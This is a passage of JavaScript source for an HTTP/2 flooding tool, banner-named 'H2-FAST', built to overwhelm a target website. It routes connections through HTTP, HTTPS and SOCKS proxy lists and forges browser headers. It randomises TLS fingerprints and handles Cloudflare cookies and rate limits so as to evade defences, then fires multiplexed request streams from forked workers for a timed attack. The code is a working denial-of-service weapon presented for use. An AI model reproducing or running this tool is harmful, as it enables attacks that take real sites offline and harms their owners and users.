        const curves = ['29', '23', '24', '25', '256', '257', '258', '259'];
        const pointFormats = ['0', '1', '2'];

        const ja3 = [
            versions[Math.floor(Math.random() * versions.length)],
            this.shuffleArray(ciphers).slice(0, 12 + Math.floor(Math.random() * 8)).join('-'),
            this.shuffleArray(extensions).slice(0, 10 + Math.floor(Math.random() * 6)).join('-'),
            this.shuffleArray(curves).slice(0, 4 + Math.floor(Math.random() * 2)).join('-'),
            this.shuffleArray(pointFormats).slice(0, 1 + Math.floor(Math.random() * 2)).join('-')
        ].join(',');

        return crypto.createHash('md5').update(ja3).digest('hex');
    },

    shuffleArray(array) { return array.sort(() => Math.random() - 0.5); },

    generateSessionTicket() { return crypto.randomBytes(48); },

    getBrowserSpecificCiphers(browserProfile) {
        return browserProfile.tlsProfile.ciphers;
    },

    getBrowserSpecificCurves(browserProfile) {
        return browserProfile.tlsProfile.curves;
    },

    createConsistentTLSOptions(baseOptions, browserProfile) {
        if (!fingerprint_opt) return baseOptions;

        const consistentOptions = { ...baseOptions };

        if (browserProfile && Math.random() < 0.8) {
            consistentOptions.ciphers = this.getBrowserSpecificCiphers(browserProfile);
        }

        if (browserProfile && Math.random() < 0.7) {
            consistentOptions.ecdhCurve = this.getBrowserSpecificCurves(browserProfile);
        }

        if (Math.random() < 0.3) {
            consistentOptions.sessionTicket = this.generateSessionTicket();
        }

        return consistentOptions;
    }
};

const FrEnc = (streamId, type, payload = "", flags = 0) => {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
};

const FrDec = (data) => {
    const lenType = data.readUInt32BE(0);
    const len = lenType >> 8;
    const type = lenType & 0xFF;
    let payload = "";

    if (len > 0) {
        payload = data.subarray(9, 9 + len);
        if (payload.length !== len) return null;
    }

    return { len, type, payload };
};

// ==================== MODIFIED: PROXY CONNECTION HANDLER (SUPPORT ALL PROTOCOLS) ====================
function connectHTTPProxy(proxy, targetHost, targetPort, onConnect, onFail) {
    const socket = net.connect(proxy.port, proxy.ip, () => {
        socket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
    });

    socket.once('data', (data) => {
        if (data.toString().includes('200')) {
            onConnect(socket);
        } else {
            socket.destroy();
            onFail();
        }
    });

    socket.on('error', () => { socket.destroy(); onFail(); });
    socket.setTimeout(10000, () => { socket.destroy(); onFail(); });
}

function connectHTTPSProxy(proxy, targetHost, targetPort, onConnect, onFail) {
    const tlsSocket = tls.connect({
        host: proxy.ip,
        port: proxy.port,
        rejectUnauthorized: false
    }, () => {
        tlsSocket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);

        tlsSocket.once('data', (data) => {
            if (data.toString().includes('200')) {
                onConnect(tlsSocket);
            } else {
                tlsSocket.destroy();
                onFail();
            }
        });
    });

    tlsSocket.on('error', () => { onFail(); });
}

function connectSocks4Proxy(proxy, targetHost, targetPort, onConnect, onFail) {
    const socket = net.connect(proxy.port, proxy.ip, () => {
        const msg = Buffer.alloc(9);
        msg[0] = 0x04;
        msg[1] = 0x01;
        msg.writeUInt16BE(targetPort, 2);

        const ipParts = targetHost.split('.');
        if (ipParts.length === 4) {
            for (let i = 0; i < 4; i++) msg[4 + i] = parseInt(ipParts[i]);
        } else {
            msg[4] = msg[5] = msg[6] = 0;
            msg[7] = 1;
        }
        msg[8] = 0x00;
        socket.write(msg);
    });

    socket.once('data', (data) => {
        if (data[1] === 0x5A) {
            onConnect(socket);
        } else {
            socket.destroy();
            onFail();
        }
    });

    socket.on('error', () => { socket.destroy(); onFail(); });
}

function connectSocks5Proxy(proxy, targetHost, targetPort, onConnect, onFail) {
    const socket = net.connect(proxy.port, proxy.ip, () => {
        socket.write(Buffer.from([0x05, 0x01, 0x00]));
    });

    socket.once('data', (data) => {
        if (data[0] !== 0x05 || data[1] !== 0x00) {
            socket.destroy();
            onFail();
            return;
        }

        const hostBuf = Buffer.from(targetHost);
        const req = Buffer.alloc(7 + hostBuf.length);
        req[0] = 0x05;
        req[1] = 0x01;
        req[2] = 0x00;
        req[3] = 0x03;
        req[4] = hostBuf.length;
        hostBuf.copy(req, 5);
        req.writeUInt16BE(targetPort, 5 + hostBuf.length);
        socket.write(req);

        socket.once('data', (resp) => {
            if (resp[1] === 0x00) {
                onConnect(socket);
            } else {
                socket.destroy();
                onFail();
            }
        });
    });

    socket.on('error', () => { socket.destroy(); onFail(); });
}

function Proxy() {
    const activeProxies = proxyStats.filter(proxy => proxy.priority !== -1);
    if (activeProxies.length === 0) {
        proxyStats.forEach(proxy => {
            if (proxy.failCount < 20) {
                proxy.priority = 0;
                proxy.failCount = 0;
            }
        });
        return Proxy();
    }

    if (proxyStats.every(proxy => proxy.priority !== 0)) {
        proxyStats.sort((a, b) => b.priority - a.priority);
    }

    const proxy = proxyStats[roundRobinIndex];
    roundRobinIndex = (roundRobinIndex + 1) % proxyStats.length;
    pIdx = proxyStats.findIndex(p => p === proxy);
    return proxy;
}

const Settings = (settings) => {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
};

const DebugLog = function (timeLeft, statusData) {
    if (!debug_opt) return;
    if (typeof statusData === 'object') {
        const statusEntries = Object.entries(statusData)
            .filter(([code, count]) => count > 0)
            .map(([code, count]) => {
                const color = getStatusCodeColor(code);
                return `${color}${code}: ${count}${colors.reset}`;
            })
            .join(' ');

        if (statusEntries) {
            console.log(`${colors.white}[${colors.red}H2-FAST${colors.white}]${colors.reset} | ${colors.white}Time${colors.red}: [${timeLeft}]${colors.reset}, ${colors.white}Status${colors.red}: ${colors.white}[${statusEntries}${colors.white}]${colors.reset}`);
        }
    }
};

const generateHeaders = () => {
    if (!currentBrowserProfile) {
        currentBrowserProfile = getRandomBrowserProfile();
    }

    const profile = currentBrowserProfile;
    const ua = profile.userAgent();
    const method = get_http_method();
    const referer = get_referer();
    const cache_header = cache_opt ? "no-cache" : "max-age=0";

    const headers = {
        ':method': method,
        ':authority': currentTargetUrl.hostname,
        ':scheme': currentTargetUrl.protocol.replace(':', ''),
        ':path': currentTargetUrl.pathname + currentTargetUrl.search,
        'user-agent': ua,
        'accept': profile.accept,
        'accept-language': 'en-US,en;q=0.9',
        'upgrade-insecure-requests': '1'
    };

    const encodings = Array.isArray(profile.acceptEncoding) ? profile.acceptEncoding : [profile.acceptEncoding];
    headers['accept-encoding'] = encodings[Math.floor(Math.random() * encodings.length)];

    if (cache_opt || Math.random() < 0.3) {
        headers['cache-control'] = cache_header;
        headers['pragma'] = 'no-cache';
    }

    if (referer && Math.random() < 0.85) {
        headers['referer'] = referer;
    }

    if (profile.secHeaders) {
        Object.entries(profile.secHeaders).forEach(([key, value]) => {
            if (Array.isArray(value)) {
                headers[key] = value[Math.floor(Math.random() * value.length)];
            } else {
                headers[key] = value;
            }
        });
    }

    if (extra_opt) {
        if (Math.random() < profile.behavior.secGpcProbability) {
            headers['sec-gpc'] = '1';
        }

        if (method === 'GET' && Math.random() < profile.behavior.prefetchProbability) {
            headers['sec-purpose'] = 'prefetch';
            headers['purpose'] = 'prefetch';
        }

        if (Math.random() < profile.behavior.dntProbability) {
            headers['dnt'] = '1';
        }
    }

    if (profile.name.includes('Chrome') && profile.behavior.priorityHeader && Math.random() < 0.4) {
        headers['priority'] = 'u=1, i';
    }

    if (profile.name.includes('Firefox') && profile.behavior.teHeader && Math.random() < 0.6) {
        headers['te'] = 'trailers';
    }

    if (method === 'POST' && opts.postdata) {
        headers['content-type'] = 'application/x-www-form-urlencoded';
        headers['content-length'] = Buffer.byteLength(opts.postdata).toString();
        headers['origin'] = `${currentTargetUrl.protocol}//${currentTargetUrl.hostname}`;
    } else if (method === 'PUT' || method === 'PATCH') {
        headers['content-type'] = 'application/x-www-form-urlencoded';
        headers['content-length'] = '0';
        headers['origin'] = `${currentTargetUrl.protocol}//${currentTargetUrl.hostname}`;
    }

    const cookieHeader = get_cookie_header_enhanced();
    if (cookieHeader && cookieHeader.trim() && Math.random() < profile.behavior.cookieProbability) {
        headers['cookie'] = cookieHeader;
    }

    if (opts.headerdata) {
        try {
            const customHeaders = Array.isArray(opts.headerdata) ? opts.headerdata : [opts.headerdata];
            customHeaders.forEach(pair => {
                if (pair && typeof pair === 'string') {
                    const [key, value] = pair.split('@');
                    if (key && value) {
                        const headerKey = key.toLowerCase().trim();
                        if (![':method', ':authority', ':scheme', ':path', 'user-agent', 'host'].includes(headerKey)) {
                            headers[headerKey] = value.trim();
                        }
                    }
                }
            });
        } catch (error) {
        }
    }

    Object.keys(headers).forEach(key => {
        if (headers[key] === undefined || headers[key] === null || headers[key] === '') {
            delete headers[key];
        }
    });

    return headers;
};

const Headers = generateHeaders;

// ==================== MODIFIED: FLOODER WITH PROXY CONNECTION HANDLER ====================
const Flooderv2 = async (config) => {
    for (let connectionIndex = 0; connectionIndex < connections; connectionIndex++) {
        try {
            currentBrowserProfile = getRandomBrowserProfile();

            const proxy = Proxy();
            if (!proxy) continue;

            const targetPort = currentTargetUrl.port || (currentTargetUrl.protocol === 'https:' ? 443 : 80);

            const connectHandlers = {
                'http': connectHTTPProxy,
                'https': connectHTTPSProxy,
                'socks4': connectSocks4Proxy,
                'socks5': connectSocks5Proxy
            };

            const connectFn = connectHandlers[proxy.protocol];
            if (!connectFn) continue;

            connectFn(proxy, currentTargetUrl.hostname, targetPort, (socket) => {
                if (currentTargetUrl.protocol === 'https:') {
                    handleHTTPSConnection(socket, config, targetPort, proxy);
                } else {
                    handleHTTPConnection(socket, config, targetPort, proxy);
                }
            }, () => {
                proxyStats[pIdx].failCount++;
                setTimeout(() => Flooderv2(config), 1);
            });

        } catch (error) {
            proxyStats[pIdx].failCount++;
        }
    }
};

function handleHTTPSConnection(socket, config, targetPort, proxy) {
    let tlsOptions = {
        socket: socket,
        ALPNProtocols: config.tls.ALPNProtocols,
        servername: currentTargetUrl.hostname,
        minVersion: config.tls.minVersion,
        maxVersion: config.tls.maxVersion,
        ciphers: config.tls.ciphers,
        honorCipherOrder: config.tls.honorCipherOrder,
        secureOptions: config.tls.secureOptions,
    };

    if (fingerprint_opt && currentBrowserProfile) {
        tlsOptions = AdvancedFingerprint.createConsistentTLSOptions(tlsOptions, currentBrowserProfile);

        if (Math.random() < 0.4) {
            tlsOptions.fingerprint = AdvancedFingerprint.generateAdvancedJA3();
        }
    }

    const tlsSocket = tls.connect(tlsOptions, () => {
        setupHTTP2Connection(tlsSocket, config, true, proxy);
    }).on('error', () => {
        tlsSocket.destroy();
        proxyStats[pIdx].failCount++;
    }).on('close', () => {
        proxyStats[pIdx].failCount++;
    });
}

function handleHTTPConnection(socket, config, targetPort, proxy) {
    setupHTTP2Connection(socket, config, false, proxy);
}

function setupHTTP2Connection(socket, config, isTLS, proxy) {
    let streamId = 1;
    let data = Buffer.alloc(0);
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const frames = [
        Buffer.from(PREFACE, 'binary'),
        FrEnc(0, 4, Settings(config.settings)),
        FrEnc(0, 8, BufWin(15663105))
    ];

    socket.write(Buffer.concat(frames));

    socket.on('data', (eventData) => {
        data = Buffer.concat([data, eventData]);
        while (data.length >= 9) {
            const frame = FrDec(data);
            if (frame != null) {
                data = data.subarray(frame.len + 9);

                if (frame.type == 4 && frame.flags == 0) {
                    socket.write(FrEnc(0, 4, "", 1));
                }

                if (frame.type == 0) {
                    let winSize = frame.len;
                    if (winSize < 60000) {
                        let incWin = 65536 - winSize;
                        winSize += incWin;
                        const updateWin = Buffer.alloc(4);
                        updateWin.writeUInt32BE(incWin, 0);
                        socket.write(FrEnc(0, 8, updateWin));
                    }
                }

                if (frame.type == 1) {
                    const headers = hpack.decode(frame.payload);
                    const statusHeader = headers.find(x => x[0] == ':status');
                    if (statusHeader) {
                        const status = statusHeader[1];
                        if (!statCounts[status]) statCounts[status] = 0;
                        statCounts[status]++;

                        if (redirect_opt && (status === '301' || status === '302' || status === '303' || status === '307' || status === '308')) {
                            if (redirectCount < MAX_REDIRECTS && handle_redirect(headers)) {
                                socket.end();
                                Flooderv2(config);
                                return;
                            }
                        }

                        if (status === '429' && ratelimit_opt) {
                            const delayTime = Math.floor(Math.random() * 5000) + 2000;
                            setTimeout(() => {
                                if (!socket.destroyed) {
                                    sendRequests();
                                }
                            }, delayTime);
                            return;
                        }

                        if (status === '403') {
                            proxyStats[pIdx].failCount++;
                        } else {
                            proxyStats[pIdx].successCount++;
                        }
                    }

                    if (cookiesession_opt) {
                        handle_set_cookie_response(headers, currentTargetUrl.hostname);
                    }
                }

                if (frame.type == 7) {
                    proxyStats[pIdx].failCount++;
                    socket.end();
                }
            } else {
                break;
            }
        }
    });

    const sendRequests = () => {
        if (socket.destroyed) return;

        const currentRate = get_current_rate();
        const currentProxy = proxyStats[pIdx];

        if (currentProxy.failCount > 10) {
            currentProxy.priority = -1;
            socket.end();
            return;
        }

        for (let i = 0; i < streams; i++) {
            for (let j = 0; j < currentRate; j++) {
                const headers = Headers();
                const encodedHeaders = hpack.encode(Object.entries(headers).filter(([key, value]) => value != null));
                const headersFrame = FrEnc(streamId, 1, Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), encodedHeaders]), 0x25);

                if ((headers[':method'] === 'POST' || headers[':method'] === 'PUT' || headers[':method'] === 'PATCH') && opts.postdata) {
                    const dataFrame = FrEnc(streamId, 0, Buffer.from(opts.postdata), 0x1);
                    socket.write(Buffer.concat([headersFrame, dataFrame]));
                } else {
                    socket.write(headersFrame);
                }

                streamId += 2;
            }
        }
    };

    setTimeout(sendRequests, delay_opt * 1000);
}

if (cluster.isMaster) {
    console.clear();
    console.log(`
                           ${colors.white}H2-FAST ${colors.white}[${colors.yellow}v8.0.0${colors.white}] | AI-LOGIC | FULL PROXY SUPPORT${colors.reset}
    `);

    let attackConfig = null;
    let currentISPInfo = null;
    let startTime = Date.now();

    getConfiguration().then(config => {
        attackConfig = config;
        currentISPInfo = config.ispInfo;

        const ispProfileName = config.name || 'default';

        console.log(`${colors.white}                       target${colors.red}:${colors.reset} ${colors.white}${trg}${colors.reset}`);
        console.log(`${colors.white}                       time${colors.red}:${colors.reset} ${colors.white}${time}${colors.reset}`);
        console.log(`${colors.white}                       methods${colors.red}:${colors.reset} ${colors.white}${methods_opt}${colors.reset}`);
        console.log(`${colors.white}                       threads${colors.red}:${colors.reset} ${colors.white}${threads}${colors.reset}`);
        console.log(`${colors.white}                       rate${colors.red}:${colors.reset} ${colors.white}${rate}${colors.reset}`);
        console.log(`${colors.white}                       proxies${colors.red}:${colors.reset} ${colors.white}${pList.length}${colors.reset}`);

        console.log(`${colors.white}                       isp_profile${colors.red}:${colors.reset} ${colors.cyan}${ispProfileName.toUpperCase()}${colors.reset}`);

        const isCloudflareTarget = currentISPInfo && currentISPInfo.isCloudflare;
        console.log(`${colors.white}                       using cloudflare cookie${colors.red}:${colors.reset} ${isCloudflareTarget ? colors.green + 'YES' : colors.red + 'NO'}${colors.reset}`);

        console.log(`${colors.white}                       browser_profiles${colors.red}:${colors.reset}`);
        Object.values(browserProfiles).forEach(profile => {
            console.log(`${colors.white}                         - ${profile.name}${colors.red}:${colors.reset} ${colors.yellow}${(profile.weight * 100).toFixed(0)}%${colors.reset}`);
        });

        const activeOptions = [];
        if (fingerprint_opt) activeOptions.push('fingerprint');
        if (cookiesession_opt) activeOptions.push('set-cookie');
        if (randrate_opt) activeOptions.push('randrate');
        if (extra_opt) activeOptions.push('extra');
        if (redirect_opt) activeOptions.push('redirect');
        if (cache_opt) activeOptions.push('cache');
        if (delay_opt) activeOptions.push('delay');
        if (http_opt) activeOptions.push('http');
        if (ratelimit_opt) activeOptions.push('ratelimit');

        console.log(`${colors.white}           option${colors.red}:${colors.reset} ${colors.white}(${activeOptions.join(', ')})${colors.reset}`);
        console.log(`\n`);

        for (let i = 0; i < threads; i++) {
            cluster.fork({ core: i % os.cpus().length });
        }
    }).catch(err => {
        console.error('Error loading configuration:', err);
        process.exit(1);
    });

    const workerStat = {};

    cluster.on('exit', (worker, code, signal) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workerStat[worker.id] = [worker, message];
    });

    setInterval(() => {
        let combinedStat = {};
        let totalRequests = 0;

        for (let w in workerStat) {
            if (workerStat[w][0].state == 'online') {
                for (let st of workerStat[w][1]) {
                    if (typeof st === 'object') {
                        for (let code in st) {
                            if (combinedStat[code] == null) combinedStat[code] = 0;
                            combinedStat[code] += st[code];
                            totalRequests += st[code];
                        }
                    }
                }
            }
        }

        const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
        const timeLeft = Math.max(0, time - elapsedSeconds);

        if (debug_opt) {
            DebugLog(timeLeft, combinedStat);
        }

    }, 1000);

    setTimeout(() => {
        console.log(`\n\n${colors.white}Attack completed${colors.reset}`);
        process.exit();
    }, time * 1000);

} else {
    let workerConfig = null;

    const initWorker = async () => {
        workerConfig = await getConfiguration();
        setInterval(() => Flooderv2(workerConfig), 1);

        setInterval(() => {
            if (mainStat.length >= 4) mainStat.shift();
            mainStat.push(statCounts);
            statCounts = {};
            process.send(mainStat);
        }, 950);
    };

    initWorker();
    setTimeout(() => process.exit(), time * 1000);
}